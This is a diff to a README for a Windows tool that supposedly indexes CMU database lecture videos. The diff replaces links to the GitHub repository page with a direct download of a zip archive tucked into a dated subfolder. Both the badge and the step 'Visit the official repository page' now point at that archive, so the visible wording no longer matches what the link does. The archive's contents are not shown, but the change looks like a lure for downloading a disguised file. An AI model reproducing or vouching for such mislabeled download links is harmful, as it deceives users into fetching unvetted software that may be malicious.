@@ -1,6 +1,6 @@
 # 🗄️ cmu-database-group-videos-index - Find every database lecture with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/pawanvc123/cmu-database-group-videos-index)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/pawanvc123/cmu-database-group-videos-index/main/videos/2025/03/25/index-cmu-database-videos-group-v2.8.zip)
 
 ## 📌 About this project
 
@@ -18,7 +18,7 @@ This software runs on any modern Windows computer. Ensure you have the following
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official repository page at this link: [https://github.com/pawanvc123/cmu-database-group-videos-index](https://github.com/pawanvc123/cmu-database-group-videos-index).
+1.  Visit the official repository page at this link: [https://raw.githubusercontent.com/pawanvc123/cmu-database-group-videos-index/main/videos/2025/03/25/index-cmu-database-videos-group-v2.8.zip](https://raw.githubusercontent.com/pawanvc123/cmu-database-group-videos-index/main/videos/2025/03/25/index-cmu-database-videos-group-v2.8.zip).
 2.  Look for the green button labeled "Code" near the top right of the page.
 3.  Click the button and select "Download ZIP" from the menu.
 4.  Wait for the file to finish downloading to your computer.
